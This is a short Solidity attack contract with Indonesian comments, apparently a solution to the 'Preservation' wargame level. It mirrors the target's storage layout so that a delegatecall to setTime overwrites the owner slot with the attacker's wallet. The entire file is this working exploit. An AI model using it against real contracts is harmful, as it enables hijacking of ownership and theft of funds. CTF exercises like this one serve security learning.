// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    // TATA LETAK HARUS SAMA PERSIS DENGAN TARGET
    address public timeZone1Library; // Slot 0
    address public timeZone2Library; // Slot 1
    address public owner;            // Slot 2 (Target Kita)
    uint256 storedTime;              // Slot 3

    // Fungsi ini harus punya nama yang sama dengan yang dipanggil target
    function setTime(uint256 _time) public {
        // Saat fungsi ini dijalankan via delegatecall oleh Preservation,
        // msg.sender adalah dompet kita (Attacker).
        // Kita ubah variabel owner (Slot 2) menjadi dompet kita.
        owner = msg.sender;
    }
}